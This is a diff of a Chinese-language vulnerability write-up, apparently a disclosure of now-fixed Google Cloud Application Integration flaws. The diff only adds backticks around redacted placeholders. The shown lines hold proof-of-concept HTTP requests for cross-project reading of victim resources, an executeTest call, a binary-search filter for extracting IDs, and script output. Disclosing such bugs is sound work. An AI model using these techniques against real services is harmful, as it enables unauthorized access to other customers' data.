@@ -103,9 +103,9 @@ GET /v1/integrationPlatform:getProtoDefinition?fullName=youtube.api.pfiinnertube
   
 Host: cloudcrmipfrontend-pa.clients6.google.com  
   
-Cookie: <redacted>  
+Cookie: `<redacted>`  
   
-Authorization: SAPISIDHASH <redacted>  
+Authorization: SAPISIDHASH `<redacted>`  
   
 Origin: https://console.cloud.google.com  
   
@@ -245,9 +245,9 @@ GET /v1/integrationPlatform:listQuotaQueue?filter=client_id%3E%22123%22&alt=prot
   
 Host: cloudcrmipfrontend-pa.clients6.google.com  
   
-Cookie: <redacted>  
+Cookie: `<redacted>`  
   
-Authorization: SAPISIDHASH <redacted>  
+Authorization: SAPISIDHASH `<redacted>`  
   
 Origin: https://console.cloud.google.com  
   
@@ -596,9 +596,9 @@ POST /v1/integrationPlatform:createDraftWorkflow HTTP/2
   
 Host: cloudcrmipfrontend-pa.clients6.google.com  
   
-Cookie: <redacted>  
+Cookie: `<redacted>`  
   
-Authorization: SAPISIDHASH <redacted>  
+Authorization: SAPISIDHASH `<redacted>`  
   
 Origin: https://console.cloud.google.com  
   
@@ -1237,11 +1237,11 @@ PoC 跑通一小时后，createDraftWorkflow 的修复就完全生效了。
 ●  
 请求 · 越权读取集成版本  
   
-GET /v1/projects/<your-project>/locations/us-central1/integrations/anythinghere/versions/<victim-uuid> HTTP/2  
+GET /v1/projects/`<your-project>`/locations/us-central1/integrations/anythinghere/versions/`<victim-uuid>` HTTP/2  
   
 Host: integrations.googleapis.com  
   
-Authorization: Bearer <redacted>  
+Authorization: Bearer `<redacted>`  
   
 API 会开开心心地把受害者的资源返回给你——因为认证检查是针对你的 project ID 做的（你当然对自己项目有权限），但没有任何访问控制去检查这个 ID 是否真的属于你的项目。  
   
@@ -1377,11 +1377,11 @@ Application Integration 暴露了一个 :executeTest 端点，按 ID 运行测�
 ●  
 请求 · executeTest  
   
-POST /v1/projects/<your-project>/locations/us-central1/integrations/x/versions/-/testCases/035c64d6-ea04-436d-8674-862f51191953:executeTest HTTP/2  
+POST /v1/projects/`<your-project>`/locations/us-central1/integrations/x/versions/-/testCases/035c64d6-ea04-436d-8674-862f51191953:executeTest HTTP/2  
   
 Host: integrations.googleapis.com  
   
-Authorization: Bearer <redacted>  
+Authorization: Bearer `<redacted>`  
   
 Content-Length: 0  
   
@@ -1443,7 +1443,7 @@ filter 参数（字段 2）明显支持 = 这种比较运算符。
 ●  
 二进制搜索条件  
   
-id = "<known-tc-uuid>" AND workflow_id > "<low>" AND workflow_id <= "<high>"  
+id = "`<known-tc-uuid>`" AND workflow_id > "`<low>`" AND workflow_id <= "`<high>`"  
   
 每个请求都会收窄区间。  
   
@@ -1458,7 +1458,7 @@ id = "<known-tc-uuid>" AND workflow_id > "<low>" AND workflow_id <= "<high>"
 ●  
 extract_by_id.py · 运行输出  
   
-$ python extract_by_id.py --token "<redacted>" --project 273897706296 --location "us-central1" --tc-id "60413427-4d07-4c36-bce0-66cfcdd81879"  
+$ python extract_by_id.py --token "`<redacted>`" --project 273897706296 --location "us-central1" --tc-id "60413427-4d07-4c36-bce0-66cfcdd81879"  
   
 Test case: 60413427-4d07-4c36-bce0-66cfcdd81879  
   
@@ -1498,11 +1498,11 @@ Total requests: 128
 ●  
 请求 · GetIntegrationVersion  
   
-GET /v1/projects/<your-project>/locations/us-central1/integrations/x/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56 HTTP/2  
+GET /v1/projects/`<your-project>`/locations/us-central1/integrations/x/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56 HTTP/2  
   
 Host: integrations.googleapis.com  
   
-Authorization: Bearer <redacted>  
+Authorization: Bearer `<redacted>`  
   
 ●  
 ●  
@@ -1511,7 +1511,7 @@ Authorization: Bearer <redacted>
   
 {  
   
-　"name": "projects/<your-project>/locations/us-central1/integrations/TestCasePOC5/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56",  
+　"name": "projects/`<your-project>`/locations/us-central1/integrations/TestCasePOC5/versions/fb1dc5f3-0380-491c-af90-5a141aa02f56",  
   
 　"state": "DRAFT",  
   
@@ -1599,7 +1599,7 @@ POST /v1/projects/273897706296/locations/us-central1/integrations/ExampleTest123
   
 Host: integrations.googleapis.com  
   
-Authorization: Bearer <redacted>  
+Authorization: Bearer `<redacted>`  
   
 Content-Length: 1033  
   
@@ -1747,11 +1747,11 @@ Failed to execute test case. Error: Unknown Error.
 ●  
 请求 · 下载执行栈  
   
-GET /v1/projects/<project>/locations/us-west1/integrations/ExampleTest1234:1/executions/id:download HTTP/2  
+GET /v1/projects/`<project>`/locations/us-west1/integrations/ExampleTest1234:1/executions/id:download HTTP/2  
   
 Host: integrations.googleapis.com  
   
-Authorization: Bearer <redacted>  
+Authorization: Bearer `<redacted>`  
   
 就能把完整的堆栈拉下来：  
   
